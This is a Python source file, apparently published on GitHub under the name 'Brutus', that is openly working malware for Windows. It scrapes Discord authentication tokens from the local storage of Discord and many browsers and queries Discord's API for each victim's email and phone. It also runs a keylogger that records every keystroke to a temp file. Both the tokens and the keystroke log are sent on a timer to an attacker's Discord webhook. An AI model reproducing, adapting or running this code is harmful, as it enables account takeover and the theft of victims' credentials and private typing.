#                  www.github.com/Fontesie               #



from multiprocessing.connection import wait
from re import findall
import keyboard
from threading import Timer
from datetime import datetime
import requests
import os
import time
from random import randint
import json
from urllib.request import Request, urlopen
import socket
import re


webhooklink = "" # Your Webhook
SEND_REPORT_EVERY = 60 # Choose the time ( 60s = 1min )






lappdata = os.getenv('LOCALAPPDATA')
output = lappdata+'/Temp/brutus' + str(randint(0, 100)) + '.tmp'    
computername = os.environ['COMPUTERNAME']
with open(output, 'w') as f:
    f.close()

def retrieve_user(token):
    return json.loads(requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36", "Content-Type": "application/json"}).text)



data = {
                        "avatar_url": "https://cdn.discordapp.com/avatars/854037287716651108/08948e1e8f48c0b056e525790f541168.png", 
                        "content" : "",
                        "username" : "Brutus"
                    }
data["embeds"] = [
                        {
                        "description" : f"**Session started** ✅\n **Session name:** {computername}",
                        "title" : "Brutus",
                        "footer": {
                        "text": "Fontesie#2621 • github.com/Fontesie"
                        }
                        }
                        ]

result = requests.post(webhooklink, json = data)

class Brutus:

    def __init__(self):
        if os.name != 'nt':
            exit()

        self.tokens = []
        self.pc_roaming = os.getenv('APPDATA')
        self.pc_local = os.getenv('LOCALAPPDATA')

        self.scrape_tokens()

        for token in self.tokens:

            raw_user_data = retrieve_user(token)
            user_json_str = json.dumps(raw_user_data)
            user = json.loads(user_json_str)
            if "username" in user:

                if webhooklink:
                    webhook_data = {"username": "Brutus", "embeds": [
                        dict(title="Brutus",

                             fields=[
                                 {
                                     "name": ":computer: Account Information",
                                     "value": f' User ID: {user["id"]}\n Username: {user["username"] + "#" + user["discriminator"]}\n Email: {user["email"]}\n Phone: {user["phone"]}',

                                     "inline": True
       
                                 },

                                 {
                                     "name": f":computer: Token:",
                                     "value": f"{token}",
                                     "inline": True
                                 },

                             ]),
                    ]}

                    data = {
                        "avatar_url": "https://cdn.discordapp.com/avatars/854037287716651108/08948e1e8f48c0b056e525790f541168.png", 
                        "content" : "",
                        "username" : "Brutus"
                    }
                    data["embeds"] = [
                        {
                        "description" : f"**Session started on** ✅\n **Session name:** {computername}",
                        "title" : "Brutus",
                        "footer": {
                        "text": "Fontesie#2621 • github.com/Fontesie"
                        }
                        }
                        ]
                    result = requests.post(webhooklink, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))


            self.tokens.remove(token)

    def scrape_tokens(self):

        crawl = {
            'Discord': self.pc_roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.pc_roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.pc_roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.pc_roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.pc_roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.pc_roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.pc_local + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.pc_local + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.pc_local + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.pc_local + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.pc_local + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.pc_local + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.pc_local + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.pc_local + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.pc_local + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.pc_local + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.pc_local + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.pc_local + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.pc_local + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.pc_local + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.pc_local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.pc_local + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for source, path in crawl.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            self.tokens.append(token)


init = Brutus()


class Keylogger:
    def __init__(self, interval, report_method=""):

        self.interval = interval
        self.report_method = report_method
        self.log = ""

    
    def callback(self, event):

        name = event.name
        if len(name) > 1:

            if name == "space":
                name = " "
            elif name == "enter":

                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
            if name == "[ALT]":
                name = " [ALT] "
            if name == "[TAB]":
                name = " [TAB] "


            
        self.log += name


    def update_filename(self):

        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"{output}"

    def report_to_file(self):

        with open(f"{self.filename}", "w") as f:
            print(self.log, file=f)
        

    def report(self):
        f = open(output, "r")
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()

            self.start_dt = datetime.now()
        self.log = ""
        data = {
            "avatar_url": "https://cdn.discordapp.com/avatars/854037287716651108/08948e1e8f48c0b056e525790f541168.png", 
            "content" : "",
            "username" : "Brutus"
        }
        data["embeds"] = [
        {
        "description" : "File uploaded.",
        "title" : "Brutus",
        "footer": {
            "text": "Fontesie#2621 • github.com/Fontesie"
        }
        }
        ]
    
        result = requests.post(webhooklink, json = data)
        result = requests.post(webhooklink, files={'upload_file': open(output,'rb')})
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()



if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()